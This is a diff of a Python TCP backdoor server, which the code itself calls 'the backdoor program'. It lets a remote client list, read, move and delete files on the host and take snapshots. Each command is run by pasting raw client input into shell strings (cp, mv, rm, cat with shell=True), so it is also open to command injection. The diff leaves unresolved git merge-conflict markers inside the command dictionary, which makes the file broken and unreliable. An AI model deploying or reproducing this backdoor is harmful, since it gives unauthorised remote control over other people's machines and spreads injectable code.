@@ -34,6 +34,11 @@ COMMAND_LIST = {                                                                
 'help': 'help - list command options\nhelp <cmd> - show detailed help for given cmd',
 'logout': 'logout - disconnect client',
 'off': 'off - terminate the backdoor program',
+<<<<<<< HEAD
+=======
+'who': 'who - list currently logged in user',
+'ps': 'ps - show currently running processes',
+>>>>>>> mason-cleaningup
 }
 
 def printWorkingDir():
@@ -107,55 +112,47 @@ def checkDifference():
 def turnServerOff():
     sys.exit()
 
-def copyFile(file1, file2):
-    procc = subprocess.Popen('cp -r ' + file1 + " " + file2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-    result, err = procc.communicate()
-    if err is not None:
-        result = err
-    return result.decode("utf-8")
-
 def copyFile(listOfWords):
     if len(listOfWords) == 3:
         procc = subprocess.Popen('cp -r ' + listOfWords[1] + " " + listOfWords[2], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
         result, err = procc.communicate()
-        if err is not None:
+        if err:
             result = err
+        else:
+            result = bytearray("OK.\n", "utf-8")
     else:
-        result = COMMAND_LIST[listOfWords[0].lower()] + "\n"
-    return result.decode("utf-8")
-
-def moveFile(file1, file2):
-    procc = subprocess.Popen('mv ' + file1 + " " + file2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-    result, err = procc.communicate()
-    if err is not None:
-        result = err
+        return COMMAND_LIST[listOfWords[0].lower()] + "\n"
     return result.decode("utf-8")
 
 def moveFile(listOfWords):
     if len(listOfWords) == 3:
         procc = subprocess.Popen('mv ' + listOfWords[1] + " " + listOfWords[2], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
         result, err = procc.communicate()
-        if err is not None:
+        if err:
             result = err
+        else:
+            result = bytearray("OK.\n", "utf-8")
     else:
-        result = COMMAND_LIST[listOfWords[0].lower()] + "\n"
+        return COMMAND_LIST[listOfWords[0].lower()] + "\n"
     return result.decode("utf-8")
 
 def removeFile(listOfWords):
-    if len(listOfWords) == 2:
-        procc = subprocess.Popen('rm -f ' + listOfWords[1], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+    if len(listOfWords) == 2 :
+        procc = subprocess.Popen('rm ' + listOfWords[1], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
         result, err = procc.communicate()
-        if err is not None:
+        if err:
             result = err
+        else:
+            result = bytearray("OK.\n", "utf-8")
     else:
-        result = COMMAND_LIST[listOfWords[0].lower()] + "\n"
+        return COMMAND_LIST[listOfWords[0].lower()] + "\n"
     return result.decode("utf-8")
 
 def cat(listOfWords):
     if len(listOfWords) == 2 :
         procc = subprocess.Popen('cat ' + listOfWords[1], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
         result, err = procc.communicate()
-        if len(result) < 1:
+        if err:
             result = err
         return result.decode("utf-8")
     else:
@@ -218,13 +215,13 @@ class MyTCPHandler(socketserver.BaseRequestHandler):                            
                 elif wordsInCommand[0].lower() == "ls" :
                     result = listContents()
                     self.request.sendall(bytearray(result, "utf-8"))
-                elif wordsInCommand[0] == "mv" :
+                elif wordsInCommand[0].lower() == "mv" :
                     result = moveFile(wordsInCommand)
                     self.request.sendall(bytearray(result, "utf-8"))
-                elif wordsInCommand[0] == "rm" :
+                elif wordsInCommand[0].lower() == "rm" :
                     result = removeFile(wordsInCommand)
                     self.request.sendall(bytearray(result, "utf-8"))
-                elif wordsInCommand[0] == "cat" :
+                elif wordsInCommand[0].lower() == "cat" :
                     result = cat(wordsInCommand)
                     self.request.sendall(bytearray(result, "utf-8"))
                 elif wordsInCommand[0].lower() == "snap" :
